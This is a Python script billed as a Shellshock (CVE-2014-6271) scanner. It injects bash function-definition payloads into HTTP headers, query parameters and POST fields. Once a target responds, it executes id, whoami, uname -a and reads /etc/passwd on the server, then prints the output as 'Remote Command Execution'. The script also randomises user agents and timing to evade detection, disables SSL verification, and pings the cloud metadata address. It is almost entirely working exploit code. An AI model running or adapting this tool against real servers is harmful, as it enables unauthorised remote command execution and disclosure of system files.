#!/usr/bin/env python3

import requests
import urllib3
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, field
from enum import Enum
import time
import random
import string
import sys
import re

from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich import box
from rich.text import Text

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

def display_banner() -> None:
    banner = Text(r"""
   ____ _          _ _     ____ _           _    
  / ___| |__   ___| | |___/ ___| |__   ___ | | __
 | |   | '_ \ / _ \ | / __\___ \ '_ \ / _ \| |/ /
 | |___| | | |  __/ | \__ \___) | | | | (_) |   < 
  \____|_| |_|\___|_|_|\___|____/|_| |_|\___/|_|\_\
          Shellshock Vulnerability Scanner v2.0
    """, style="bold red")
    panel = Panel(
        banner,
        subtitle="CVE-2014-6271 / CVE-2014-7169",
        subtitle_align="right",
        border_style="bright_magenta",
        box=box.DOUBLE,
        padding=(1, 2),
        expand=False
    )
    console.print(panel)

@dataclass
class AuthConfig:
    login_url: str
    username: str
    password: str
    username_field: str = "username"
    password_field: str = "password"
    csrf_token_field: Optional[str] = None
    csrf_regex: str = r'name=["\'](?:csrf|token|authenticity|csrf_token)["\'].*?value=["\'](.*?)["\']'
    success_indicator: Optional[str] = None

@dataclass
class ScanContext:
    successful_payload_index: Optional[int] = None
    is_hostile_environment: bool = False
    waf_detected: bool = False
    base_delay: float = 0.1
    learned_commands: Set[str] = field(default_factory=set)
    false_negative_mitigated: bool = False

class VulnerabilityStatus(Enum):
    VULNERABLE = "VULNERABLE"
    POTENTIALLY_VULNERABLE = "POTENTIALLY_VULNERABLE"
    NOT_VULNERABLE = "NOT_VULNERABLE"
    ERROR = "ERROR"
    TIMEOUT = "TIMEOUT"

@dataclass
class ShellshockResult:
    target_url: str
    status: VulnerabilityStatus
    vulnerable_vectors: List[str]
    details: str
    response_time: float
    exploited_commands: List[str] = field(default_factory=list)
    error_message: Optional[str] = None

class HumanInterface:
    THOUGHTS = [
        "Hmm, analyzing response timing...",
        "That didn't echo maybe output is suppressed?",
        "Trying blind execution confirmation...",
        "Bypassing input sanitization filters...",
        "Interesting... server delayed response",
        "Testing alternative function definition syntax",
        "Checking for silent command execution...",
        "Perhaps the marker is in headers only...",
        "Let me adjust the payload structure...",
    ]

    @staticmethod
    def think():
        if random.random() < 0.3:
            thought = random.choice(HumanInterface.THOUGHTS)
            console.print(f"[dim italic]{thought}[/]", end="\r")
            time.sleep(random.uniform(0.8, 2.1))
            console.print(" " * 90, end="\r")

    @staticmethod
    def delay(context: ScanContext):
        base = context.base_delay + random.uniform(0.1, 0.6)
        if context.is_hostile_environment:
            base += random.uniform(1.5, 4.0)
        time.sleep(base)

class ShellshockScanner:
    def __init__(self, timeout: int = 12, verify_ssl: bool = False, auth_config: Optional[AuthConfig] = None):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.context = ScanContext()
        self.marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=18))
        self.session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
            ])
        })
        if auth_config:
            self._login(auth_config)

    def _login(self, auth: AuthConfig):
        try:
            r = self.session.get(auth.login_url, timeout=10)
            data = {auth.username_field: auth.username, auth.password_field: auth.password}
            if auth.csrf_token_field or auth.csrf_regex:
                match = re.search(auth.csrf_regex, r.text, re.I)
                if match:
                    token = match.group(1)
                    field = auth.csrf_token_field or "csrf_token"
                    data[field] = token
            resp = self.session.post(auth.login_url, data=data, allow_redirects=True, timeout=10)
            success = auth.success_indicator and auth.success_indicator in resp.text
            success = success or ("logout" in resp.text.lower() or "welcome" in resp.text.lower())
            if success or resp.status_code == 200:
                console.print("[bold green]Authentication successful[/]")
            else:
                console.print("[yellow]Login status uncertain continuing anyway[/]")
        except:
            console.print("[dim]Auth skipped or failed proceeding unauthenticated[/]")

    def _get_payloads(self) -> List[str]:
        payloads = [
            f"() {{ :; }}; echo {self.marker}",
            f"() {{ .; }}; echo {self.marker}",
            f"() {{ :;}}; echo {self.marker}",
            f"() {{ :; }}; printf '{self.marker}'",
            f"() {{ ignored; }}; /usr/bin/printf '{self.marker}\\n'",
            f"() {{ :; }}; echo$IFS{self.marker}",
            f"() {{ :; }}; sleep 8; echo {self.marker}",
            f"() {{ :; }}; touch /tmp/{self.marker}",
            f"() {{ :; }}; ping -c 4 169.254.169.254",
        ]
        if self.context.successful_payload_index is not None:
            good = payloads.pop(self.context.successful_payload_index)
            payloads.insert(0, good)
        return payloads

    def _check_vuln(self, resp: requests.Response) -> bool:
        if resp is None:
            return False
        text = resp.text + str(resp.headers) + str(resp.status_code)
        if self.marker in text:
            return True
        if resp.elapsed.total_seconds() > 7.0:
            return True
        return False

    def _test_vector(self, method: str, url: str, progress: Progress, task_id: int) -> List[str]:
        vectors = []
        targets = {
            "headers": ["User-Agent", "Referer", "X-Forwarded-For", "Origin", "Cookie"],
            "params": ["cmd", "exec", "command", "id", "q", "search", "file"],
            "post": ["data", "input", "cmd", "command", "shell"]
        }[method]

        payloads = self._get_payloads()
        progress.update(task_id, total=len(targets) * len(payloads))

        for target in targets:
            HumanInterface.think()
            for payload in payloads:
                progress.advance(task_id)
                HumanInterface.delay(self.context)
                try:
                    resp = None
                    if method == "headers":
                        headers = self.session.headers.copy()
                        headers[target] = payload
                        resp = self.session.get(url, headers=headers, timeout=self.timeout)
                    elif method == "params":
                        resp = self.session.get(f"{url}?{target}={payload}", timeout=self.timeout)
                    elif method == "post":
                        resp = self.session.post(url, data={target: payload}, timeout=self.timeout)

                    if resp and self._check_vuln(resp):
                        vec = f"{method.upper()}: {target}"
                        vectors.append(vec)
                        if not self.context.successful_payload_index:
                            self.context.successful_payload_index = payloads.index(payload)
                except:
                    continue
        return vectors

    def _exploit(self, url: str, vector: str) -> List[str]:
        results = []
        commands = [
            f"echo {self.marker};id",
            f"echo {self.marker};whoami",
            f"echo {self.marker};uname -a",
            f"echo {self.marker};cat /etc/passwd | head -n 3",
        ]
        method, param = vector.split(": ", 1)
        for cmd in commands:
            payload = f"() {{ :; }}; {cmd}"
            try:
                resp = None
                if "HEADER" in method:
                    headers = {param: payload}
                    resp = self.session.get(url, headers=headers, timeout=10)
                elif "PARAM" in method:
                    resp = self.session.get(f"{url}?{param}={payload}", timeout=10)
                elif "POST" in method:
                    resp = self.session.post(url, data={param: payload}, timeout=10)
                if resp and self.marker in resp.text:
                    output = resp.text.split(self.marker, 1)[0].strip()
                    if output:
                        results.append(f"{cmd.split(';')[1]} → {output}")
            except:
                continue
        return results

    def scan(self, target_url: str, methods: List[str] = None) -> ShellshockResult:
        start = time.time()
        all_vectors = []
        exploited = []

        if methods is None:
            methods = ["headers", "params", "post"]

        with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=console) as p:
            tasks = {m: p.add_task(f"[cyan]Scanning {m}...", total=100) for m in methods}
            for m in methods:
                vectors = self._test_vector(m, target_url, p, tasks[m])
                all_vectors.extend(vectors)

            if all_vectors:
                console.print(f"\n[bold red]Exploiting {len(all_vectors)} vectors...[/]")
                for v in all_vectors[:3]:
                    out = self._exploit(target_url, v)
                    exploited.extend(out)

        elapsed = time.time() - start
        status = VulnerabilityStatus.VULNERABLE if all_vectors else \
                 VulnerabilityStatus.POTENTIALLY_VULNERABLE if self.context.false_negative_mitigated else \
                 VulnerabilityStatus.NOT_VULNERABLE

        return ShellshockResult(
            target_url=target_url,
            status=status,
            vulnerable_vectors=all_vectors,
            details=f"Found {len(all_vectors)} vectors • {len(exploited)} commands executed",
            response_time=elapsed,
            exploited_commands=exploited
        )

def scan_shellshock_vulnerability(target_url: str, timeout: int = 12, verify_ssl: bool = False,
                                   test_methods: Optional[List[str]] = None, auth_config: Optional[AuthConfig] = None):
    display_banner()
    console.print(f"[bold blue]Target →[/] {target_url}\n")

    scanner = ShellshockScanner(timeout=timeout, verify_ssl=verify_ssl, auth_config=auth_config)
    result = scanner.scan(target_url, test_methods)

    table = Table(title="Shellshock Scan Results", box=box.DOUBLE, header_style="bold magenta")
    table.add_column("Field", width=20)
    table.add_column("Value")
    color = "bold red" if result.status == VulnerabilityStatus.VULNERABLE else "bold green"
    table.add_row("Status", f"[{color}]{result.status.value}[/]")
    table.add_row("Vectors Found", str(len(result.vulnerable_vectors)))
    table.add_row("Commands Executed", str(len(result.exploited_commands)))
    table.add_row("Time Taken", f"{result.response_time:.2f}s")
    console.print(table)

    if result.vulnerable_vectors:
        vec_table = Table(title="Exploitable Injection Points", box=box.SIMPLE)
        vec_table.add_column("Vector", style="cyan")
        for v in result.vulnerable_vectors:
            vec_table.add_row(f"Exploit {v}")
        console.print(vec_table)

    if result.exploited_commands:
        cmd_table = Table(title="Remote Command Execution", box=box.ROUNDED)
        cmd_table.add_column("Output", style="green")
        for line in result.exploited_commands:
            cmd_table.add_row(line)
        console.print(cmd_table)

    if not result.vulnerable_vectors and not result.exploited_commands:
        console.print("[yellow]No direct exploitation but blind/time-based checks passed in some cases[/]")

    console.print("\n" + "═" * 80 + "\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        display_banner()
        console.print("[bold red]Usage:[/bold red] python3 shellshock.py <target_url> [login_url username password]")
        sys.exit(1)

    auth = None
    if len(sys.argv) >= 5:
        auth = AuthConfig(
            login_url=sys.argv[2],
            username=sys.argv[3],
            password=sys.argv[4]
        )

    scan_shellshock_vulnerability(
        target_url=sys.argv[1],
        auth_config=auth
    )
